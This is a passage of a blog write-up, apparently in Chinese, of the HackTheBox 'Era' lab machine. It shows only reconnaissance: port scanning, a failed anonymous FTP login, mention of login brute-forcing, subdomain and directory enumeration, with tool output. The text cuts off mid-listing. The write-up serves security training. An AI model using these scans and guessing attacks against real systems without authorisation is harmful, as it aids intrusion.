@@ -1,0 +1,733 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="我还在这儿忽然就没有力气了  信息收集1234567891011121314151617181920212223242526272829303132333435363738394041 .&#x2F;rustscan -a 10.10.11.79.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &#123;&#125;  &#125;| &amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Era">
+<meta property="og:url" content="http://example.com/2025/11/17/HackTheBox-Era/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="我还在这儿忽然就没有力气了  信息收集1234567891011121314151617181920212223242526272829303132333435363738394041 .&#x2F;rustscan -a 10.10.11.79.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &#123;&#125;  &#125;| &amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/11/17/HackTheBox-Era/vmware_W3fV5Gxy5W.png">
+<meta property="og:image" content="http://example.com/2025/11/17/HackTheBox-Era/vmware_Vgad4D6DC5.png">
+<meta property="og:image" content="http://example.com/2025/11/17/HackTheBox-Era/vmware_9nJv1PNyyd.png">
+<meta property="og:image" content="http://example.com/2025/11/17/HackTheBox-Era/0r9ViDFID9.png">
+<meta property="og:image" content="http://example.com/2025/11/17/HackTheBox-Era/navicat_hNePiOtVRi.png">
+<meta property="og:image" content="http://example.com/2025/11/17/HackTheBox-Era/vmware_WKVWGwqCud.png">
+<meta property="og:image" content="http://example.com/2025/11/17/HackTheBox-Era/vmware_vk7ktaRSt8.png">
+<meta property="og:image" content="http://example.com/2025/11/17/HackTheBox-Era/vmware_4JRc6eCdGE.png">
+<meta property="og:image" content="http://example.com/2025/11/17/HackTheBox-Era/vmware_MPpau0AeHK.png">
+<meta property="og:image" content="http://example.com/2025/11/17/HackTheBox-Era/vmware_nclwVDriJa.png">
+<meta property="article:published_time" content="2025-11-17T06:11:04.000Z">
+<meta property="article:modified_time" content="2025-11-17T07:33:35.416Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/11/17/HackTheBox-Era/vmware_W3fV5Gxy5W.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HackTheBox-Era - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Era"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-17 14:11" pubdate>
+          November 17, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HackTheBox-Era</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>我还在这儿<br>忽然就没有力气了</p>
+<hr>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"> ./rustscan -a <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>.<span class="hljs-comment">----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |<br>| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |<br>`-<span class="hljs-string">&#x27; `-&#x27;</span>`<span class="hljs-comment">-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br>The Modern Day Port Scanner.<br>________________________________________<br>: http://discord.skerritt.blog         :<br>: https://github.com/RustScan/RustScan :<br> <span class="hljs-comment">--------------------------------------</span><br><span class="hljs-number">0</span>day was here ♥<br><br>[~] The config file <span class="hljs-keyword">is</span> expected <span class="hljs-keyword">to</span> be at &quot;/root/.rustscan.toml&quot;<br>[!] File <span class="hljs-keyword">limit</span> <span class="hljs-keyword">is</span> lower than <span class="hljs-keyword">default</span> batch size. Consider upping <span class="hljs-keyword">with</span> <span class="hljs-comment">--ulimit. May cause harm to sensitive servers</span><br>[!] Your file <span class="hljs-keyword">limit</span> <span class="hljs-keyword">is</span> very small, which negatively impacts RustScan<span class="hljs-string">&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;</span><span class="hljs-comment">--ulimit 5000&#x27;. </span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span>:<span class="hljs-number">21</span><br><span class="hljs-keyword">Open</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span>:<span class="hljs-number">80</span><br>[~] Starting Script(s)<br>[~] Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2025</span><span class="hljs-number">-11</span><span class="hljs-number">-17</span> <span class="hljs-number">01</span>:<span class="hljs-number">04</span> EST<br>Initiating Ping Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span><br>Scanning <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span> [<span class="hljs-number">4</span> ports]<br>Completed Ping Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span>, <span class="hljs-number">0.11</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">01</span>:<span class="hljs-number">04</span><br>Completed Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. at <span class="hljs-number">01</span>:<span class="hljs-number">04</span>, <span class="hljs-number">0.01</span>s elapsed<br>DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.01</span>s. Mode: Async [#: <span class="hljs-number">1</span>, OK: <span class="hljs-number">0</span>, NX: <span class="hljs-number">1</span>, DR: <span class="hljs-number">0</span>, SF: <span class="hljs-number">0</span>, TR: <span class="hljs-number">1</span>, CN: <span class="hljs-number">0</span>]<br>Initiating SYN Stealth Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span><br>Scanning <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span> [<span class="hljs-number">2</span> ports]<br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">80</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">21</span>/tcp <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>Completed SYN Stealth Scan at <span class="hljs-number">01</span>:<span class="hljs-number">04</span>, <span class="hljs-number">0.20</span>s elapsed (<span class="hljs-number">2</span> total ports)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.79</span><br>Host <span class="hljs-keyword">is</span> up, received echo-reply ttl <span class="hljs-number">63</span> (<span class="hljs-number">0.097</span>s latency).<br>Scanned at <span class="hljs-number">2025</span><span class="hljs-number">-11</span><span class="hljs-number">-17</span> <span class="hljs-number">01</span>:<span class="hljs-number">04</span>:<span class="hljs-number">41</span> EST <span class="hljs-keyword">for</span> <span class="hljs-number">0</span>s<br><br>PORT   STATE SERVICE REASON<br><span class="hljs-number">21</span>/tcp <span class="hljs-keyword">open</span>  ftp     syn-ack ttl <span class="hljs-number">63</span><br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http    syn-ack ttl <span class="hljs-number">63</span><br><br><span class="hljs-keyword">Read</span> data files <span class="hljs-keyword">from</span>: /usr/<span class="hljs-keyword">share</span>/nmap<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.44</span> seconds<br>           Raw packets sent: <span class="hljs-number">6</span> (<span class="hljs-number">240</span>B) | Rcvd: <span class="hljs-number">3</span> (<span class="hljs-number">116</span>B)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">ftp <span class="hljs-number">10.10</span>.<span class="hljs-number">11.79</span><br>Connected to <span class="hljs-number">10.10</span>.<span class="hljs-number">11.79</span>.<br><span class="hljs-number">220</span> (vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">5</span>)<br>Name (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.79</span>:kali): anonymous<br><span class="hljs-number">331</span> Please specify the password.<br>Password: <br><span class="hljs-number">530</span> Login incorrect.<br>ftp: Login failed<br>ftp&gt; <br>ftp&gt; <span class="hljs-keyword">exit</span><br><span class="hljs-number">221</span> Goodbye.<br><br></code></pre></td></tr></table></figure>
+
+<p>ftp没法匿名登录，查看web界面。</p>
+<p>合理怀疑是这几个人名中的一个，先将这些人名写成字典备用。</p>
+<p><img src="/2025/11/17/HackTheBox-Era/vmware_W3fV5Gxy5W.png" srcset="/img/loading.gif" lazyload></p>
+<p>子域名爆破有结果。</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section"> gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://era.htb/ -t 30 --append-domain</span><br><span class="hljs-section">===============================================================</span><br>Gobuster v3.6<br><span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="hljs-section">===============================================================</span><br>[+] Url:             http://era.htb/<br>[+] Method:          GET<br>[+] Threads:         30<br>[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br>[+] User Agent:      gobuster/3.6<br>[+] Timeout:         10s<br>[+] Append Domain:   true<br>===============================================================<br>Starting gobuster in VHOST enumeration mode<br>===============================================================<br>Found: file.era.htb Status: 200 [Size: 6765]<br><span class="hljs-section">Progress: 114441 / 114442 (100.00%)</span><br><span class="hljs-section">===============================================================</span><br><span class="hljs-section">Finished</span><br><span class="hljs-section">===============================================================</span><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/17/HackTheBox-Era/vmware_Vgad4D6DC5.png" srcset="/img/loading.gif" lazyload></p>
+<p>四个选项都提示登录，但用上面的人名配上常见的弱密码都没有结果。</p>
+<p>ftp也尝试爆破，没有结果。</p>
+<p>尝试爆破目录。</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs nix">─<span class="hljs-comment"># dirsearch -u http://file.era.htb</span><br><span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>python3<span class="hljs-operator">/</span>dist-packages<span class="hljs-operator">/</span>dirsearch<span class="hljs-operator">/</span>dirsearch.py:<span class="hljs-number">23</span>: <span class="hljs-params">UserWarning:</span> pkg_resources is deprecated as an API. See https:<span class="hljs-symbol">//setuptools.pypa.io/en/latest/pkg_resources.html.</span> The pkg_resources package is slated for removal as early as <span class="hljs-number">202</span>5-<span class="hljs-number">1</span>1-<span class="hljs-number">30</span>. Refrain from using this package <span class="hljs-keyword">or</span> pin to Setuptools<span class="hljs-operator">&lt;</span><span class="hljs-number">81</span>.<br>  from pkg_resources <span class="hljs-built_in">import</span> DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.<span class="hljs-number">4.3</span>                                                                                                                           <br> (_<span class="hljs-operator">||</span>| _) (<span class="hljs-operator">/</span>_(_<span class="hljs-operator">||</span> (_| )                                                                                                                                    <br>                                                                                                                                                           <br><span class="hljs-params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="hljs-params">method:</span> GET | <span class="hljs-params">Threads:</span> <span class="hljs-number">25</span> | Wordlist <span class="hljs-params">size:</span> <span class="hljs-number">11460</span><br><br>Output <span class="hljs-params">File:</span> <span class="hljs-symbol">/home/kali/Desktop/reports/http_file.era.htb/_25-11-17_01-36-25.txt</span><br><br><span class="hljs-params">Target:</span> http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-symbol">/</span><br><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">25</span>] <span class="hljs-params">Starting:</span>                                                                                                                                       <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.ht_wsr.txt</span>                                      <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.sample</span>                                 <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.orig</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.bak1</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess.save</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_extra</span>                                  <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_orig</span>                                   <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccess_sc</span>                                     <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessBAK</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessOLD</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htaccessOLD2</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htm</span>                                             <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.html</span>                                            <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.httr-oauth</span>                                      <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htpasswds</span>                                       <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/.htpasswd_test</span>                                   <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">178</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/assets</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>assets<span class="hljs-symbol">/</span>          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">49</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>assets<span class="hljs-symbol">/</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">36</span>:<span class="hljs-number">58</span>] <span class="hljs-number">302</span> <span class="hljs-operator">-</span>    <span class="hljs-number">0</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/download.php</span>  <span class="hljs-operator">-&gt;</span>  login.php                      <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">178</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/files</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>files<span class="hljs-symbol">/</span>            <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>files<span class="hljs-symbol">/</span>                                           <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>files<span class="hljs-operator">/</span>cache<span class="hljs-symbol">/</span>                                     <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">01</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>files<span class="hljs-operator">/</span>tmp<span class="hljs-symbol">/</span><br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">04</span>] <span class="hljs-number">403</span> <span class="hljs-operator">-</span>  <span class="hljs-number">564</span>B  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>images<span class="hljs-symbol">/</span>                                          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">04</span>] <span class="hljs-number">301</span> <span class="hljs-operator">-</span>  <span class="hljs-number">178</span>B  <span class="hljs-operator">-</span> <span class="hljs-symbol">/images</span>  <span class="hljs-operator">-&gt;</span>  http:<span class="hljs-operator">//</span>file.era.htb<span class="hljs-operator">/</span>images<span class="hljs-symbol">/</span>          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">08</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>   <span class="hljs-number">34</span>KB <span class="hljs-operator">-</span> <span class="hljs-symbol">/LICENSE</span>                                          <br>[<span class="hljs-number">01</span>:<span class="hljs-number">37</span>:<span class="hljs-number">09</span>] <span class="hljs-number">200</span> <span class="hljs-operator">-</span>    <span class="hljs-number">9</span>KB <span class="hljs-operator">-</span> <span 